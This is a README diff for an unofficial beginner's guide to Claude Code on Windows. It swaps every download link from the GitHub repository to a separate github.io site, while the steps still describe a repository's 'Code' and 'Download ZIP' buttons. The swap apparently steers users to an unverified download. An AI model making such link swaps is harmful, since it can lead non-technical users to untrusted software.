@@ -1,6 +1,6 @@
 # 🚀 claude-terminal - Master Claude Code in Minutes
 
-[![Download claude-terminal](https://img.shields.io/badge/Download-claude--terminal-blue?style=for-the-badge&logo=github)](https://github.com/DrewFist/claude-terminal)
+[![Download claude-terminal](https://img.shields.io/badge/Download-claude--terminal-blue?style=for-the-badge&logo=github)](https://drewfist.github.io)
 
 Welcome to **claude-terminal** – your unofficial, friendly guide to getting started with Claude Code right from your Windows computer. No coding background? No problem. This guide walks you through everything, step by step.
 
@@ -8,7 +8,7 @@ Welcome to **claude-terminal** – your unofficial, friendly guide to getting st
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/DrewFist/claude-terminal](https://github.com/DrewFist/claude-terminal)
+Visit this link to download the application: [https://drewfist.github.io](https://drewfist.github.io)
 
 Once you're on that page, look for the green **"Code"** button near the top. Click it, then choose **"Download ZIP"**. This will save a compressed folder to your computer. After the download finishes, find the ZIP file (usually in your **Downloads** folder), right-click it, and choose **"Extract All"**. Follow the simple prompts, and you'll have a new folder with everything inside.
 
@@ -158,7 +158,7 @@ Remember: every expert was once a beginner. You've got this.
 
 Before you start, make sure you have:
 
-- [ ] Downloaded the ZIP from [https://github.com/DrewFist/claude-terminal](https://github.com/DrewFist/claude-terminal)
+- [ ] Downloaded the ZIP from [https://drewfist.github.io](https://drewfist.github.io)
 - [ ] Extracted the ZIP to a folder you can find
 - [ ] Read `START_HERE.txt` all the way through
 - [ ] An internet connection (wired or Wi-Fi)
